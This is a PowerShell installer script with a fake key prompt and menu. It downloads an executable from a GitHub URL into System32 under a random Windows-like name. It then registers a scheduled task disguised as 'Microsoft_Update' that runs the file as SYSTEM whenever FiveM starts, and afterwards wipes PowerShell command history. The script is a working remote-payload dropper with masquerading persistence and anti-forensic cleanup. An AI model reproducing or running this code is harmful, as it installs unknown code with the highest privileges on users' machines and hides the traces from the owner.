$ErrorActionPreference = "SilentlyContinue"
Clear-Host

# Identity Generation
$p = @("font","drv","host","win","svc") | Get-Random
$m = @("vcp","mgr","svc","hosts","core") | Get-Random
$r = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
$f = "$p$m`_$r.exe"
$t = "Microsoft_Update_$r"
$d = "C:\Windows\System32\$f"
$u = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/fontdrvhost.exe"

# 1. Key Prompt
$null = Read-Host "Key"

# 2. Menu Screen
:MenuLoop while($true) {
    Clear-Host
    Write-Host "1. Install"
    Write-Host "2. Check"
    Write-Host "0. Exit"
    
    $choice = Read-Host "Select"

    switch ($choice) {
        "1" {
            Clear-Host
            Write-Host "Processing..."
            Invoke-WebRequest -Uri $u -Outfile $d -UseBasicParsing
            Unblock-File -Path $d
            auditpol /set /subcategory:"Process Creation" /success:enable
            $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName']='C:\Users\$env:USERNAME\AppData\Local\FiveM\FiveM.exe']]"
            schtasks /create /tn "$t" /tr "$d" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f
            Write-Host "Complete." -ForegroundColor Green
            Start-Sleep 2
            
            # Auto Cleanup & Exit after install
            Clear-History
            Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
            exit
        }
        "2" {
            Clear-Host
            Write-Host "--- INFO ---"
            Write-Host "File: $f"
            Write-Host "Task: $t"
            Write-Host "Status: $(if (Test-Path $d) { "Ready" } else { "Not Found" })"
            Pause
        }
        "0" { 
            exit 
        }
    }
}
